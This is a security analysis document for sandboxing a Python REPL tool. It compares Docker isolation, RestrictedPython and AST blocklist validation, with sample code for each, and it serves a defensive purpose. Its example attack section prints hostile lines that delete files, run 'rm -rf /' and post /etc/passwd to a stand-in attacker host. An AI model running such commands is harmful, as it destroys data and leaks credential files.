# Security Analysis: Python Code Execution Sandboxing

## Current Implementation Status

### ✅ **PRODUCTION: Docker Sandbox Implementation**

The `python_repl` function in `tools.py` now implements **production-grade Docker-based sandboxing** with multiple security layers.

### Current Implementation (tools.py)

The implementation uses a multi-layer security approach:

1. **AST Validation** (pre-execution): Blocks dangerous operations at parse time
2. **Docker Containerization** (runtime): Complete process isolation with resource limits
3. **Restricted Execution Fallback**: Safe fallback if Docker unavailable

### Security Features Implemented

- ✅ **Docker Container Isolation**: Code runs in isolated containers
- ✅ **Resource Limits**: CPU (50%), Memory (256MB), Timeout (30s)
- ✅ **Network Disabled**: No external network access
- ✅ **Read-only Volumes**: Code files mounted read-only
- ✅ **AST Validation**: Blocks dangerous imports and function calls
- ✅ **Execution Logging**: All code execution attempts are logged
- ✅ **Graceful Fallback**: Falls back to restricted execution if Docker unavailable

### Security Risks

1. **File System Access**: Code can read/write/delete any file the process has access to
2. **Network Access**: Can make HTTP requests, open sockets, etc.
3. **System Commands**: Can execute shell commands via `os.system()`, `subprocess`, etc.
4. **Environment Variables**: Can access and modify environment variables
5. **Import Dangerous Modules**: Can import `os`, `subprocess`, `shutil`, `socket`, etc.
6. **Resource Exhaustion**: Can consume unlimited CPU, memory, or create infinite loops
7. **Data Exfiltration**: Can send sensitive data to external servers

### Example Attack Vectors

```python
# Delete files
import os
os.remove("/important/file.txt")

# Execute shell commands
import subprocess
subprocess.run(["rm", "-rf", "/"])

# Exfiltrate data
import requests
requests.post("http://attacker.com", data=open("/etc/passwd").read())

# Resource exhaustion
while True:
    pass  # Infinite loop
```

## Best Practices for Python Sandboxing

### 1. **Use RestrictedPython** (Recommended for Production)

RestrictedPython is a library that provides a secure subset of Python:

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins, guarded_iter_unpack
from RestrictedPython.transformer import RestrictingNodeTransformer

def python_repl_sandboxed(code: str) -> str:
    """Execute Python code in a restricted environment"""
    # Compile with restrictions
    byte_code = compile_restricted(
        code,
        filename='<inline>',
        mode='exec'
    )
    
    # Restricted globals
    restricted_globals = {
        '__builtins__': safe_builtins,
        '_getiter_': guarded_iter_unpack,
        '_print_': print,
    }
    
    # Execute in restricted environment
    exec(byte_code, restricted_globals)
```

**Pros:**
- Actively maintained
- Blocks dangerous operations at AST level
- Prevents imports of dangerous modules
- Limits builtin access

**Cons:**
- Some legitimate code may not work
- Requires testing to ensure compatibility

### 2. **Docker Container Sandboxing** (Most Secure)

Run code execution in isolated Docker containers:

```python
import docker
import tempfile
import os

def python_repl_docker(code: str) -> str:
    """Execute Python code in a Docker container"""
    client = docker.from_env()
    
    # Create temporary file with code
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        code_file = f.name
    
    try:
        # Run in container with resource limits
        result = client.containers.run(
            'python:3.11-slim',
            f'python /code/{os.path.basename(code_file)}',
            volumes={os.path.dirname(code_file): {'bind': '/code', 'mode': 'ro'}},
            mem_limit='256m',  # Memory limit
            cpu_period=100000,
            cpu_quota=50000,  # 50% CPU
            network_disabled=True,  # No network access
            remove=True,
            timeout=30  # Timeout in seconds
        )
        return result.decode('utf-8')
    except Exception as e:
        return f"Error: {e}"
    finally:
        os.unlink(code_file)
```

**Pros:**
- Complete isolation from host system
- Resource limits (CPU, memory, time)
- No network access
- Can be reset after each execution

**Cons:**
- Requires Docker
- Higher overhead
- More complex setup

### 3. **AST-Based Validation** (Lightweight Option)

Validate and block dangerous operations before execution:

```python
import ast
import sys

DANGEROUS_IMPORTS = {'os', 'subprocess', 'sys', 'shutil', 'socket', 'requests'}
DANGEROUS_BUILTINS = {'eval', 'exec', 'compile', '__import__', 'open'}

class SecurityChecker(ast.NodeVisitor):
    def __init__(self):
        self.violations = []
    
    def visit_Import(self, node):
        for alias in node.names:
            if alias.name in DANGEROUS_IMPORTS:
                self.violations.append(f"Dangerous import: {alias.name}")
        self.generic_visit(node)
    
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name):
            if node.func.id in DANGEROUS_BUILTINS:
                self.violations.append(f"Dangerous function call: {node.func.id}")
        self.generic_visit(node)

def python_repl_validated(code: str) -> str:
    """Execute Python code after AST validation"""
    try:
        tree = ast.parse(code)
        checker = SecurityChecker()
        checker.visit(tree)
        
        if checker.violations:
            return f"Security violation: {', '.join(checker.violations)}"
        
        # Restricted environment
        safe_builtins = {
            'print': print,
            'len': len,
            'range': range,
            'sum': sum,
            'max': max,
            'min': min,
            'abs': abs,
            'round': round,
            # Add more safe builtins as needed
        }
        
        env = {'__builtins__': safe_builtins}
        exec(compile(tree, filename='<ast>', mode='exec'), env)
        return "Execution successful"
    except Exception as e:
        return f"Error: {e}"
```

**Pros:**
- Lightweight
- No external dependencies
- Fast execution

**Cons:**
- Can be bypassed with creative code
- Less secure than Docker
- Requires careful maintenance of blocklist

### 4. **Hybrid Approach** (✅ IMPLEMENTED)

The current implementation uses a hybrid approach combining multiple security layers:

1. **AST Validation** (pre-execution): Blocks dangerous operations at parse time
2. **Docker Containerization** (runtime): Complete process isolation
3. **Resource Limits**: CPU, memory, and time constraints
4. **Network Disabled**: No external network access
5. **Read-only Volume**: Code file mounted read-only
6. **Restricted Fallback**: Safe fallback if Docker unavailable

## Additional Security Measures

1. **Code Length Limits**: Prevent extremely long code blocks
2. **Execution Timeout**: Kill long-running code
3. **Memory Limits**: Prevent memory exhaustion
4. **Rate Limiting**: Limit code execution frequency per user/session
5. **Whitelist Approach**: Only allow specific safe operations
6. **Audit Logging**: Log all code execution attempts and results

## References

- [RestrictedPython Documentation](https://restrictedpython.readthedocs.io/)
- [OWASP Code Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Code_Injection_Prevention_Cheat_Sheet.html)
- [Python Security Best Practices](https://python.readthedocs.io/en/latest/library/security.html)

